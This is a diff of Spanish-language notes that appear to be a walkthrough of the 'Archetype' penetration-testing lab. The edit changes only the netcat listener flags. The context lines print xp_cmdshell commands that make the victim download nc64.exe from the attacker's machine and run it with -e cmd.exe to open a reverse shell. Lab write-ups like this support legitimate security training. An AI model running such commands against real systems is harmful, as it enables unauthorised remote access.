@@ -31,7 +31,7 @@ Y como podemos ver responde que somos archetype/sql_svc. Asi que ya confirmamos 
 # Un uso que se le puede dar es para mandar una [[Reverse shell]] 
 #### Para mandar la [[Reverse shell]] vamos a necesitar de [[Netcat]]
 
-[Link de netcat para 64bits](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) Vamos a levantar un server de [[python3 -m http.server]] desde nuestra maquina, para que por wget lo descargue la maquina victima. Y a posteriori vamos a ponernos en escucha con  [[rlwrap nc -lvnp 443]] para la reverseshell
+[Link de netcat para 64bits](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) Vamos a levantar un server de [[python3 -m http.server]] desde nuestra maquina, para que por wget lo descargue la maquina victima. Y a posteriori vamos a ponernos en escucha con  [[rlwrap -cAr nc -lvnp 443]] para la reverseshell
 
 ```shell
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.16/nc64.exe -outfile nc64.exe           / Descargamos el archivo
@@ -41,6 +41,6 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 
 ![[Archetype14.png]]
 ![[Archetype13.png]]
 
-[[rlwrap nc -lvnp 443]]  Para estar en escucha
+[[rlwrap -cAr nc -lvnp 443]]  Para estar en escucha
 
 ![[Imagenes/Archetype16.png]]
